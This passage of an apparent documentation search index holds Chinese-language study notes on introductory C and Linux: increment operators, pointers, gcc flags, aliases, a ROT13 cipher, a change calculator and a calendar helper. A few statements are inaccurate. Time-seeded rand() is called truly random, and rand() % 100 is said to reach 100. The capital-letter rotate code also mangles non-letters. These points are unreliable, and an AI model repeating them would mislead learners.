\u662f\u5bf9\u51fd\u6570\u7684\u4e00\u79cd\u58f0\u660e\uff0c\u5b83\u5411\u7f16\u8bd1\u5668\u63d0\u4f9b\u4e86\u51fd\u6570\u7684\u540d\u79f0\u3001\u53c2\u6570\u7c7b\u578b\u4ee5\u53ca\u8fd4\u56de\u7c7b\u578b\uff0c\u4f46\u4e0d\u5305\u542b\u51fd\u6570\u7684\u5b9e\u9645\u5b9e\u73b0\uff08\u51fd\u6570\u4f53\uff09\u3002\u51fd\u6570\u539f\u578b\u901a\u5e38\u51fa\u73b0\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6216\u5934\u6587\u4ef6\u4e2d\uff0c\u7528\u4e8e\u5728\u51fd\u6570\u8c03\u7528\u4e4b\u524d\u544a\u8bc9\u7f16\u8bd1\u5668\u51fd\u6570\u7684\u57fa\u672c\u4fe1\u606f\u3002</p> <pre><code>void foo();\nvoid foo(void);  // Not the same!\n</code></pre> <p>\u4ee5\u4e0a\u4e24\u884c\u5b8c\u5168\u4e0d\u4e00\u6837\uff0c\u540e\u8005\u5411\u7f16\u8bd1\u5668\u8868\u660e\u6ca1\u6709\u53c2\u6570\u540e\u6709\u6548\u5173\u95ed\u4e86\u7c7b\u578b\u68c0\u67e5\uff0c\u56e0\u6b64\u63a8\u8350\u5728\u7a7a\u53c2\u6570\u65f6\u4f7f\u7528 void \u58f0\u660e\u3002</p>"},{"location":"cs/c/2.2/#increment-value-copy","title":"Increment &amp; Value Copy","text":"<pre><code>int a = 5;\nint b = a++;\n</code></pre> <p>a++ \u4e3a\u540e\u7f6e\u81ea\u589e\uff0creturn \u539f\u6570\u503c\u540e\u518d\u52a0 1\uff0c\u56e0\u6b64 a \u7ed3\u679c\u4e3a 6\uff0cb \u4e3a 5</p> <pre><code>int a = 5;\nint b = ++a;\n\n// b = 6, a =6\n</code></pre> <p>++a \u4e3a\u524d\u7f6e\u81ea\u589e\uff0c\u7ed9\u539f\u6570\u503c\u5148\u52a0\u4e0a 1 \u540e\u518d return \u8be5\u503c</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid increment(int a)\n{\n    a++;\n}\n\nint main(void)\n{\n    int i = 10;\n\n    increment(i);\n\n    printf(\"i == %d\\n\", i);  // 10\n}\n</code></pre> <p>Pass by value</p> <p>\u5728 C \u8bed\u8a00\u4e2d\uff0c\u5f53\u4f60\u5c06\u4e00\u4e2a\u53d8\u91cf\u4f20\u9012\u7ed9\u51fd\u6570\u65f6\uff0c\u51fd\u6570\u63a5\u6536\u7684\u662f\u8be5\u53d8\u91cf\u7684\u526f\u672c\uff0c\u800c\u4e0d\u662f\u8be5\u53d8\u91cf\u7684\u5f15\u7528\u3002\u8fd9\u610f\u5473\u7740\u5728\u51fd\u6570 increment \u4e2d\uff0ca \u662f i \u7684\u526f\u672c\uff0c\u5bf9 a \u7684\u4efb\u4f55\u4fee\u6539\u4e0d\u4f1a\u5f71\u54cd main \u51fd\u6570\u4e2d\u7684 i\u3002\u5e76\u4e14 void \u51fd\u6570\u672c\u8eab\u65e0\u6cd5 return \u4efb\u4f55\u503c\uff0c\u56e0\u6b64\u7b54\u6848\u4e3a 10\uff0c\u8981\u60f3\u5728 void \u51fd\u6570\u7684\u65f6\u5019\u52a0 1 \u5c31\u8981\u7528\u5230\u6307\u9488\u6982\u5ff5\uff1a</p> <p>Pass by reference</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid increment(int *a) {\n    (*a)++;\n}\n\nint main(void) {\n    int i = 10;\n\n    increment(&amp;i);  // \u4f20\u9012 i \u7684\u5730\u5740\n\n    printf(\"i == %d\\n\", i);  // \u73b0\u5728\u8f93\u51fa\u662f 11\n}\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4fee\u6539\u540e\u7684\u4ee3\u7801\u4e2d\uff0cincrement \u51fd\u6570\u63a5\u6536 i \u7684\u5730\u5740\uff0c\u5e76\u76f4\u63a5\u5bf9 i \u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64 i \u7684\u503c\u4f1a\u88ab\u771f\u6b63\u589e\u52a0\uff0c\u8f93\u51fa\u4f1a\u662f 11\u3002</p>"},{"location":"cs/c/2.3/","title":"2.3 Linux Review","text":""},{"location":"cs/c/2.3/#fri-workshop-1","title":"Fri Workshop 1","text":"<p>Ubuntu \u4ecd\u7136\u662f\u76ee\u524d\u5de5\u4e1a\u754c\u5b89\u5168\u8003\u8651\u8303\u56f4\u5185\u6700\u4f18\u7684\u7cfb\u7edf\uff0c\u63d0\u4f9b LTS \u7248\u672c</p> <pre><code>cal 08 2024\nexpr 90 \\* 2\n</code></pre> <p>\u5176\u4e2d man \u624b\u518c\u4e0d\u540c\u7684 Linux \u53d1\u884c\u5546\u90fd\u7f16\u5199\u4e86\u81ea\u5df1\u7684\u7248\u672c\uff0c\u81ea\u5df1\u6311\u9009\u4e00\u4e2a</p> <p>\u5e38\u89c1 Linux \u547d\u4ee4\u53ef\u4ee5\u5728 Dive into Systems \u8fd9\u672c\u4e66\u4e2d\u627e\u5230</p>"},{"location":"cs/c/2.3/#unix-philosophy","title":"Unix Philosophy","text":"<p>\u4e3a\u4e00\u4e2a\u95ee\u9898\u5199\u4e00\u4e2a\u6700\u597d\u7684\u5de5\u5177\u53bb\u89e3\u51b3\uff0c\u89e3\u51b3\u5176\u4ed6\u95ee\u9898\u7684\u5de5\u5177\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u5de5\u5177\u4f5c\u4e3a\u7ec4\u4ef6\u89e3\u51b3\u95ee\u9898\uff0c\u548c Apple \u7684\u5f00\u53d1\u54f2\u5b66\u7c7b\u4f3c\u3002</p>"},{"location":"cs/c/2.3/#compiler","title":"Compiler","text":"<p>gcc \u662f\u7531 GNU \u9879\u76ee\u5f00\u53d1\u548c\u7ef4\u62a4\u7684\u7f16\u8bd1\u5668\u96c6\u5408, cc \u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\u6307\u5411\u5b83</p> <pre><code>cc -std=c11 -Wall -Werror -o myprogram source.c\n</code></pre> <p><code>-Wall</code> \u542f\u7528\u6240\u6709\u5e38\u89c1\u7684\u7f16\u8bd1\u8b66\u544a\uff0c<code>-Werror</code> \u5c06\u6240\u6709\u8b66\u544a\u89c6\u4e3a\u9519\u8bef</p> <p>\u8be5\u6307\u4ee4\u7528 c11 \u6807\u51c6\u548c\u8b66\u544a\u89c4\u8303\u4e25\u683c\u8fdb\u884c\u7f16\u8bd1\u64cd\u4f5c\uff0c\u7528\u4e8e\u7f16\u5199\u9ad8\u8d28\u91cf\u4ee3\u7801</p>"},{"location":"cs/c/2.3/#labsheet-1","title":"Labsheet 1","text":"<p>\u8be5\u8bfe\u7a0b\u4f1a\u6709\u4e24\u4e2a Projects \u5360\u6bd4 50%</p> <p>Linux \u9996\u9009\u7684\u7f16\u8bd1\u5668\u662f gcc \u800c macOS \u4e3a clang \u5176\u4e3a 2007 \u5e74\u82f9\u679c\u81ea\u4e3b\u7814\u53d1\u7684\u7f16\u8bd1\u5668\u4f5c\u4e3a LLVM \u9879\u76ee\u4e4b\u4e00</p> <p>\u4e24\u8005\u90fd\u53ef\u4ee5\u88ab cc \u76f4\u63a5\u8c03\u7528\uff0c\u53ef\u5728 Terminal \u4e2d\u76f4\u63a5\u6267\u884c</p>"},{"location":"cs/c/2.3/#alias","title":"Alias","text":"<p>Linux \u4e2d\u6709\u4e00\u79cd\u547d\u4ee4\u5feb\u6377\u952e\u7684\u7528\u6cd5\uff0c\u548c Windows \u4e0b\u7684\u73af\u5883\u53d8\u91cf\u7c7b\u4f3c</p> <pre><code>vim ~/.bash_profile\n</code></pre> <pre><code>alias c=\"clear\"\nalias ll=\"ls -l\"\n</code></pre> <pre><code>source ~/.bash_profile\n</code></pre> <p>\u7136\u540e\u5728\u4e0b\u6b21\u767b\u9646\u4f1a\u8bdd\u65f6\uff0c\u7cfb\u7edf\u5c31\u4f1a\u81ea\u52a8\u52a0\u8f7d\u522b\u540d\u673a\u5236\u7136\u540e\u751f\u6548</p>"},{"location":"cs/c/2.3/#rot3","title":"ROT3","text":"<p>\u7ef4\u62a4\u7ed3\u6784\u826f\u597d\u7684\u8ba1\u7b97\u673a\u5b66\u4e60\u76ee\u5f55\u5c42\u6b21\u7ed3\u6784\uff0c\u5212\u5206\u5de5\u4f5c\u903b\u8f91\u5206\u533a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n// Compile this program with:\n//    cc -std=c11 -Wall -Werror -o rotate rotate.c\n\n#define ROT 13\n\n//  The rotate function returns the character ROT positions further along the\n//  alphabetic character sequence from c, or c if c is not lower-case\n\nchar rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    else {\n        return c;\n    }\n}\n\n//  Execution of the whole program begins at the main function\n\nint main(int argcount, char *argvalue[])\n{\n    // Exit with an error if the number of arguments (including\n    // the name of the executable) is not precisely 2\n    if(argcount != 2) {\n        fprintf(stderr, \"%s: program expected 1 argument, but instead received %i\\n\",\n                    argvalue[0], argcount-1);\n        exit(EXIT_FAILURE);\n    }\n    else {\n        // Calculate the length of the first argument\n        int length = strlen(argvalue[1]);\n\n        // Loop for every character in the text\n        for(int i = 0; i &lt; length; i++) {\n            // Determine and print the ciphered character\n            printf(\"%c\", rotate(argvalue[1][i]));\n        }\n\n        // Print one final new-line character\n        printf(\"\\n\");\n\n        // Exit indicating success\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <p>\u7f16\u8bd1\u671f\u95f4\u5982\u679c\u4e0d\u63d0\u4f9b <code>-o</code> \u53c2\u6570\u76f4\u63a5 <code>cc rotate.c</code>  \u4f1a\u591a\u51fa\u4e00\u4e2a a.out \u53ef\u6267\u884c\u6587\u4ef6\uff0c<code>a.out</code> \u4e3a\u9ed8\u8ba4\u540d</p> <p>\u4e3a\u4e86\u4e25\u683c\u7f16\u8bd1\u6240\u6709 C11 \u7a0b\u5e8f\uff0c\u6574\u4e2a Lab \u5c06\u91c7\u7528\u4ee5\u4e0b\u7f16\u8bd1\u53c2\u6570\u6267\u884c\uff1a</p> <pre><code>cc -std=c11 -Wall -Werror -o rotate rotate.c\n</code></pre> <p>\u7ed3\u5408 vim \u63d0\u4f9b\u7684 alias \u529f\u80fd\uff0c\u53ef\u901a\u8fc7\u7f16\u8f91 <code>~/.bash_profile</code> \u6dfb\u52a0\u4ee5\u4e0b\u884c\u7b80\u5316\u7f16\u8bd1\u6d41\u7a0b</p> <pre><code>alias mycc=\"cc -std=c11 -Wall -Werror\"\nsource ~/.bash_profile\n</code></pre> <p>\u65e5\u540e\u7684\u7f16\u8bd1\u6d41\u7a0b\u5c31\u76f4\u63a5\u80fd\u7b80\u5316\u6210\uff1a</p> <pre><code>mycc -o rotate rotate.c\n</code></pre>"},{"location":"cs/c/2.3/#linux-commands","title":"Linux Commands","text":"<p>\u9664\u53bb\u5e38\u89c1\u6eda\u74dc\u70c2\u719f\u7684\u6307\u4ee4\u6a21\u5f0f\uff1a</p> <pre><code>man -k vim\n# -k \u5217\u51fa\u6240\u6709 vim \u7b80\u8ff0\n\nls -lt \n# \u6309\u7167\u65f6\u95f4\u6392\u5e8f\n\nls -lR\n# \u591a\u6587\u4ef6\u5939\u5faa\u73af\u5217\u4e3e\n\ncp -R olddir newdir\n# \u591a\u6587\u4ef6\u5939\u5faa\u73af\u62f7\u8d1d\n\ndu -sh dirname\n# \u7528\u4eba\u6027\u5316\u683c\u5f0f\u663e\u793a\u8be5\u6587\u4ef6\u5939\u78c1\u76d8\u4f7f\u7528\u72b6\u51b5\n\ncat -s filename\n# \u53bb\u7a7a\u884c\u67e5\u770b\u6587\u4ef6\n\nhead -3 filename \nhead -c 100 filename\ntail -3 filename\ntail -c 100 filename\n# \u4ece\u6587\u4ef6\u5f00\u5934\u6216\u7ed3\u5c3e\u9605\u8bfb\u7279\u5b9a\u884c\u6216\u5b57\u6570\n\nwc -l filename\n# \u9ed8\u8ba4\u662f\u663e\u793a\u5b57\u6570\u3001\u5355\u8bcd\u6570\u548c\u884c\u6570\uff0c-l \u662f\u6587\u4ef6\u884c\u6570\n\ngrep pattern filename\ngrep -c pattern filename\n# \u663e\u793a\u5339\u914d\u8fd9\u79cd\u6a21\u5f0f\u7684\u6b21\u6570\ngrep -i pattern filename\n# \u5ffd\u7565\u6587\u4ef6\u5927\u5c0f\u5199\n\nps aux\n# \u6240\u6709\u8fdb\u7a0b\u548c\u5c5e\u6027\n</code></pre>"},{"location":"cs/c/2.3/#1-integer-arithmetic","title":"1. Integer Arithmetic","text":"<p>\u6fb3\u5927\u5229\u4e9a\u8d85\u5e02\u627e\u96f6\u5c0f\u7a0b\u5e8f\uff0c\u8f93\u5165\u5546\u54c1\u4ef7\u683c\u8f93\u51fa\u652f\u4ed8 100 \u5206\u540e\u5f97\u5230\u7684\u627e\u96f6\u4fe1\u606f\uff0c\u627e\u96f6\u786c\u5e01\u79cd\u7c7b\u6709 1c 2c 5c 10c 20c 50c</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int const argc, char *argv[]) {\n    // argc \u4ee3\u8868\u7684\u53c2\u6570\u6570\u91cf\uff0cargv \u50a8\u5b58\u6240\u6709\u53c2\u6570\n    // %dn means a integer with a line break\n    if (argc != 2) {\n        printf(\"Format Error, please use ./change cents.\\n\");\n        return 0;\n    }\n\n    int const price = atoi(argv[1]);\n\n    if (price &lt;= 0 || price &gt; 100) {\n        printf(\"Data Type Error, please use int and the price needs to &lt;= 100.\\n\");\n        return 0;\n    }\n\n    int change = 100 - price;\n    int const coin_50 = change / 50;\n    change = change % 50;\n    int const coin_20 = change / 20;\n    change = change % 20;\n    int const coin_10 = change / 10;\n    change = change % 10;\n    int const coin_5 = change / 5;\n    change = change % 5;\n    int const coin_2 = change / 2;\n    change = change % 2;\n    int const coin_1 = change / 1;\n    printf(\"%d 50c, %d 20c, %d 10c, %d 5c, %d 2c, %d 1c for changes.\\n\", coin_50, coin_20,\n    coin_10, coin_5, coin_2, coin_1);\n}\n</code></pre> <p>\u8fd9\u9053\u9898\u662f\u8d2a\u5fc3\u7b97\u6cd5\u548c\u52a8\u6001\u89c4\u5212\u5e38\u8003\u7684\u9898\uff0c\u4f46\u662f\u5728\u4e0d\u7528\u7b97\u6cd5\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u80fd\u624b\u52a8\u66f4\u65b0\u4f59\u989d\u5e76\u624b\u52a8\u964d\u5e8f\u53d6\u4f59\u6570\u6700\u7ec8\u6574\u4f53\u5c06\u7b54\u6848\u7b54\u5e94\u51fa\u6765\uff1b\u7a0b\u5e8f\u5728\u7f16\u5199\u8fc7\u7a0b\u4e2d\u7406\u89e3\u4e86 C \u7684\u4e00\u4e9b\u7ec6\u8282\uff1a</p> <ol> <li> <p><code>printf</code> \u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u4e3a\u5b57\u7b26\u4e32\uff0c\u6240\u6709\u7684\u62fc\u63a5\u90fd\u662f\u7528 % \u5f00\u5934\u7684\u66ff\u6362\u7b26\u62fc\u63a5\u4e0a\u53bb</p> </li> <li> <p>argc \u4e3a arg count \u4e5f\u5c31\u662f\u6570\u91cf\uff0c./main \u7b97 argv[0] \u56e0\u6b64\u7b97\u4e24\u4e2a</p> </li> <li> <p>argv \u4e3a char \u6570\u7ec4, char * \u4e3a\u6307\u9488\u6307\u5411\u5176\u4e2d\u7684\u4e00\u4e2a char</p> </li> <li> <p>In C, you cannot directly cast a string (which argv[1] is, as a char *) to an int because a string is a sequence of characters (a pointer) and not directly an integer value. </p> <p>\u7531\u4e8e\u76f4\u63a5\u5185\u5b58\u7ba1\u7406\u548c\u5e95\u5c42\u7684\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u8bbe\u8ba1\uff0cC \u8bed\u8a00\u5e76\u4e0d\u652f\u6301\u50cf Python \u4e00\u6837\u76f4\u63a5\u8f6c\u6362\u6570\u636e\u7c7b\u578b\uff0c\u9700\u8981\u7528 atoi \u8fd9\u4e2a\u5305\u5c06 pointer \u627e\u5230\u540e\u6210\u529f\u8f6c\u6362\u3002<code>char str[] = \"Hello, World!\";</code> \u4e3a\u5b57\u7b26\u4e32\u6570\u636e\u7c7b\u578b\u58f0\u660e\u65b9\u5f0f\u3002 </p> </li> </ol>"},{"location":"cs/c/2.3/#2-call-system-date-function","title":"2. Call system date function","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    printf(\"%d\",system(\"date\"));\n    return 0;\n}\n</code></pre> <p>\u8c03\u7528\u7cfb\u7edf\u4f9d\u7136\u82f1 <code>stdlib</code> \u5305\u4e2d\u7684 <code>system</code> \u51fd\u6570\uff0cdate \u7684\u8f93\u51fa\u6709\u610f\u601d\u7684\u662f\u6574\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u8f93\u51fa\u540e\u4f1a\u7b54\u5e94\u4e00\u4e2a 0, \u8fd9\u662f\u4ee3\u8868 the date command executed successfully with an exit status of 0.</p>"},{"location":"cs/c/2.3/#4-array","title":"4. Array","text":"<p>\u968f\u673a\u5927\u4e50\u900f\u6d17\u724c\u7a0b\u5e8f</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nint main() {\n    srand(time(NULL));\n    int result[6];\n    for (int i = 0; i &lt; 6; i++) {\n        int const ranNum = rand() % 100;\n        result[i] = ranNum;\n        printf(\"%d\\n\", result[i]);\n    }\n}\n</code></pre> <p>\u8ba1\u7b97\u673a\u79d1\u5b66\u9886\u57df\u6709\u771f\u968f\u673a\u6570\u548c\u4f2a\u968f\u673a\u6570\u7684\u6982\u5ff5\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6bcf\u6b21\u751f\u6210\u7684\u6570\u4e3a\u771f\u968f\u673a\uff0c\u5bfc\u5165 <code>time(NULL)</code> \u8fd4\u56de\u4e00\u4e2a time_t \u7c7b\u578b\u7684\u503c\uff0c\u8868\u793a\u5f53\u524d\u65f6\u95f4\u4e0e Unix \u7eaa\u5143 (1970\u5e741\u67081\u65e500:00:00 UTC) \u7684\u79d2\u5dee\u503c\uff0c\u6570\u636e\u7c7b\u578b\u4e3a long int \u6253\u5370\u7528 <code>%ld</code>\u3002\u8fd9\u6837\u6bcf\u4e00\u6b21\u83b7\u53d6\u968f\u673a\u6570\u7684\u65f6\u5019\uff0c\u751f\u6210\u79cd\u5b50\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c<code>%</code> \u80fd\u591f\u4fdd\u8bc1\u65e0\u8bba\u591a\u5927\u7684\u968f\u673a\u6570\u6700\u7ec8\u90fd\u80fd\u63a7\u5236\u5728 0 ~ 100 \u7684\u8303\u56f4\u4e4b\u5185\u3002</p>"},{"location":"cs/c/2.3/#tasks","title":"Tasks","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n// Compile this program with:\n//    cc -std=c11 -Wall -Werror -o rotate rotate.c\n\n#define ROT 13\n\n//  The rotate function returns the character ROT positions further along the\n//  alphabetic character sequence from c, or c if c is not lower-case\n\nchar rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    else {\n        return c;\n    }\n}\n\n//  Execution of the whole program begins at the main function\n\nint main(int argcount, char *argvalue[])\n{\n    // Exit with an error if the number of arguments (including\n    // the name of the executable) is not precisely 2\n    if(argcount != 2) {\n        fprintf(stderr, \"%s: program expected 1 argument, but instead received %i\\n\",\n                    argvalue[0], argcount-1);\n        exit(EXIT_FAILURE);\n    }\n    else {\n        // Calculate the length of the first argument\n        int length = strlen(argvalue[1]);\n\n        // Loop for every character in the text\n        for(int i = 0; i &lt; length; i++) {\n            // Determine and print the ciphered character\n            printf(\"%c\", rotate(argvalue[1][i]));\n        }\n\n        // Print one final new-line character\n        printf(\"\\n\");\n\n        // Exit indicating success\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"cs/c/2.3/#rot-13-rot-3","title":"ROT 13 -&gt; ROT 3","text":"<p>\u7b2c 9 \u884c\u7684 13 \u6539\u4e3a 3, 45 \u884c\u52a0\u4e2a\u6362\u884c\u7b26</p>"},{"location":"cs/c/2.3/#position","title":"POSITION","text":"<pre><code>printf(\"%c, %c\\n\", argvalue[1][i], rotate(argvalue[1][i]));\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 char \u7528\u7684\u89e3\u6790\u7b26\u53f7\u4e3a <code>%c</code> </p>"},{"location":"cs/c/2.3/#original-char","title":"ORIGINAL CHAR","text":"<pre><code>printf(\"%c, %c, %d\\n\", argvalue[1][i], rotate(argvalue[1][i]), i + 1);\n</code></pre>"},{"location":"cs/c/2.3/#deal-with-capital-char","title":"DEAL WITH CAPITAL CHAR","text":"<pre><code>char rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    return ('A' + (c - 'A' + ROT) % 26);\n}\n</code></pre>"},{"location":"cs/c/2.3/#explanation","title":"Explanation","text":"<pre><code>#include &lt;stdio.h&gt;\n</code></pre> <p>\u4e3b\u8981\u5728\u4ee3\u7801\u4e2d\u652f\u6301 <code>fprintf</code> <code>printf</code> \u4e24\u4e2a\u51fd\u6570\uff0cfprintf \u80fd\u591f\u5b9a\u4e49\u6307\u5b9a\u7684\u8f93\u51fa\u6d41\uff0c\u5728\u5185\u5b58\u4e2d\u6253\u5370\uff0c\u53ef\u4ee5\u5728 buffer \u7f51\u7edc\u4e2d\u64cd\u4f5c\u7b49\u7b49</p> <pre><code>int fprintf(FILE *stream, const char *format, ...);\n</code></pre> <pre><code>fprintf(stderr, \"An error occurred: %s\\n\", \"File not found\");\n</code></pre> <p>\u4ee3\u7801\u4e2d\u5b9a\u4e49\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u4e3a\u6b64\u63d0\u793a</p> <p>\u6807\u51c6\u6d41\uff1a</p> <ul> <li>stderr\uff1a\u6807\u51c6\u9519\u8bef\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3002</li> <li>stdout\uff1a\u6807\u51c6\u8f93\u51fa\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u6b63\u5e38\u8f93\u51fa\u3002</li> <li>stdin\uff1a\u6807\u51c6\u8f93\u5165\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u83b7\u53d6\u7528\u6237\u8f93\u5165\u3002</li> </ul> <ul> <li>scanf\uff1a\u7528\u4e8e\u4ece\u6807\u51c6\u8f93\u5165\u6d41\u8bfb\u53d6\u683c\u5f0f\u5316\u8f93\u5165\u3002</li> </ul> <ul> <li>fopen\uff1a\u7528\u4e8e\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u4ee5\u8fdb\u884c\u8bfb\u53d6\u6216\u5199\u5165\u3002</li> </ul> <ul> <li>fclose\uff1a\u7528\u4e8e\u5173\u95ed\u4e00\u4e2a\u6253\u5f00\u7684\u6587\u4ef6\u3002</li> </ul> <ul> <li>fgets\uff1a\u7528\u4e8e\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u53d6\u4e00\u884c\u6587\u672c\u3002</li> </ul> <pre><code>#include &lt;stdlib.h&gt;\n\n// \u7528\u4e8e\u4ee5\u4e0b\u4e24\u4e2a\u51fd\u6570\nexit(EXIT_SUCCESS);\nexit(EXIT_FAILURE);\n</code></pre> <p>\u662f C \u8bed\u8a00\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\uff0c\u7528\u4e8e\u7ec8\u6b62\u5f53\u524d\u7a0b\u5e8f\u5e76\u8fd4\u56de\u4e00\u4e2a\u72b6\u6001\u7801\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u3002</p> <pre><code>#include &lt;string.h&gt;\n\n// strlen() \u51fd\u6570\u8c03\u7528\u8ba1\u7b97 char \u5b57\u7b26\u957f\u5ea6\n</code></pre> <pre><code>#include &lt;ctype.h&gt;\n\n// islower() \n</code></pre> <p>ctype \u4e3b\u8981\u7528\u4e8e\u5904\u7406\u5b57\u7b26\u7684\u5206\u7c7b\u548c\u8f6c\u6362\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\uff0c\u7528\u4e8e\u68c0\u67e5\u5b57\u7b26\u7684\u7c7b\u578b\uff08\u5982\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7a7a\u767d\u5b57\u7b26\u7b49\uff09\u4ee5\u53ca\u5c06\u5b57\u7b26\u8fdb\u884c\u5927\u5c0f\u5199\u8f6c\u6362\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"cs/c/2.4/","title":"2.4 MyCal","text":""},{"location":"cs/c/2.4/#fri-workshop-2","title":"Fri Workshop 2","text":"<p>\u4e3b\u8981\u65e8\u5728\u521b\u5efa\u4e00\u4e2a cal \u4e00\u6837\u7684 c \u7f16\u5199\u7684\u65e5\u5386\u7a0b\u5e8f\uff0c\u7528 double for loop \u6253\u5370 4 \u6708\u6216 8 \u6708\u7684\u65e5\u5386\uff0c\u4ece\u76f4\u63a5\u8c03\u7528\u7cfb\u7edf\u7684 cal \u5230\u81ea\u5df1\u7f16\u5199\uff0c\u719f\u6089\u4e4b\u524d\u8bfe\u7a0b\u7684\u77e5\u8bc6\u70b9\u3002</p> <p>\u8be5\u7a0b\u5e8f\u7684\u6838\u5fc3\u7b97\u6cd5\u4e00\u5171\u6709\u4e24\u4e2a\uff1a</p> <ol> <li> <p>\u4e8c\u7ef4\u77e9\u9635\u7684\u5c4f\u5e55\u663e\u793a</p> </li> <li> <p>\u5982\u4f55\u7cbe\u786e\u663e\u793a\u65e5\u671f\u5c5e\u4e8e\u661f\u671f\u51e0</p> </li> </ol> <pre><code>   December 2023\nSu Mo Tu We Th Fr Sa\n.. .. .. .. ..  1  2 \n 3  4  5  6  7  8  9 \n10 11 12 13 14 15 16 \n17 18 19 20 21 22 23 \n24 25 26 27 28 29 30 \n31 .. .. .. .. .. .. \n</code></pre> <p>\u4e8c\u7ef4\u77e9\u9635\u53ef\u4ee5\u7528\u5d4c\u5957 for loop \u89e3\u51b3\uff0c\u800c\u7b2c\u4e00\u884c\u7684\u5185\u5bb9\u53ef\u6839\u636e\u53c2\u6570\u7684\u8f93\u5165\u5355\u72ec\u5904\u7406\uff0c\u7b2c\u4e8c\u884c\u53ef\u5355\u72ec\u6253\u5370\uff0csolution \u4e2d\u5c06\u5bfb\u627e\u6307\u5b9a\u6708\u4efd\u7684\u7b2c\u4e00\u5929\u662f\u661f\u671f\u51e0\u7684\u7b97\u6cd5\u5355\u72ec\u63d0\u70bc\u6210\u4e00\u4e2a\u6587\u4ef6\u63d0\u4f9b\u7ed9\u4e3b\u7a0b\u5e8f <code>#include</code></p>"},{"location":"cs/c/2.4/#first_day_of_monthc","title":"first_day_of_month.c","text":"<pre><code>#include &lt;time.h&gt;\n#include &lt;string.h&gt;\n\n//  written by ...\n\n//  PROVIDED WITHOUT MUCH EXPLANATION YET!\n\n//  RETURNS  0=Sun, 1=Mon, .....\n//\nint first_day_of_month(int month, int year)\n{\n    struct tm tm;\n\n//  SET ALL FIELDS OF tm TO ZERO TO MAKE SOME FIELDS 'UNKNOWN'\n    memset(&amp;tm, 0, sizeof(tm));\n\n//  INITIALIZE THE FILEDS THAT WE ALREADY KNOW\n    tm.tm_mday  = 1;\n    tm.tm_mon   = month-1;              // 0=Jan, 1=Feb, ....\n    tm.tm_year  = year-1900;\n\n//  ASK THE POSIX FUNCTION mktime TO DETERMINE THE 'UNKNOWN' FIELDS\n//  See: http://pubs.opengroup.org/onlinepubs/9699919799/\n    mktime(&amp;tm);\n\n//  RETURN THE INTEGER MONTH VALUE\n    return tm.tm_wday;                  // 0=Sun, 1=Mon, .....\n}\n</code></pre>"},{"location":"cs/c/2.4/#analyzation","title":"Analyzation","text":""},{"location":"cs/c/2.4/#mktime","title":"mktime","text":"<p>\u7b97\u6cd5\u7684\u6838\u5fc3\u5de5\u5177\u4e3a\u4e00\u4e2a\u53eb mktime \u7684\u51fd\u6570\uff1a</p> <p>mktime \u51fd\u6570\u4f7f\u7528 struct tm \u4e2d\u63d0\u4f9b\u7684\u5b57\u6bb5\u6765\u8ba1\u7b97\u65f6\u95f4\uff0c\u5e76\u5c06\u90a3\u4e9b\u6ca1\u6709\u660e\u786e\u6307\u5b9a\u7684\u5b57\u6bb5\uff08\u4f8b\u5982 tm_wday \u548c tm_yday\uff09\u8ba1\u7b97\u51fa\u6765\u3002\u5982\u679c struct tm \u4e2d\u7684\u67d0\u4e9b\u5b57\u6bb5\u672a\u521d\u59cb\u5316\u4e14\u5305\u542b\u5783\u573e\u503c\uff0cmktime \u53ef\u80fd\u4f1a\u4ea7\u751f\u9519\u8bef\u7684\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u4f7f\u7528 memset \u53ef\u4ee5\u907f\u514d\u8fd9\u4e9b\u6f5c\u5728\u7684\u95ee\u9898\u3002</p>"},{"location":"cs/c/2.4/#struct","title":"struct","text":"<p>struct \u7ed3\u6784\u4f53\u5176\u5728 